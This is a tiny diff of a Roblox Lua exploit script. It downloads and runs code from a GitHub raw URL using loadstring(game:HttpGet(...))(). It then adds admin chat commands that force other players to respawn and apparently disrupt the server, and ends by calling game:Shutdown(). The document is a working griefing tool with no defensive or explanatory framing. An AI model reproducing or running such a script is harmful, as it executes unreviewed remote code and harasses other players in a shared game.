@@ -3,7 +3,8 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/draftedtokyoto/kah/main/InflictRewrite"))()
 -- █ ▛▟ █〓 ▙▄ █ ❰ ▜▛
-repeat wait() until game:IsLoaded()
+game.Players:Chat("respawn others")
+wait(0.0025)
 game.Players:Chat("silc inflict.")
 wait(3.5)
 game:Shutdown()
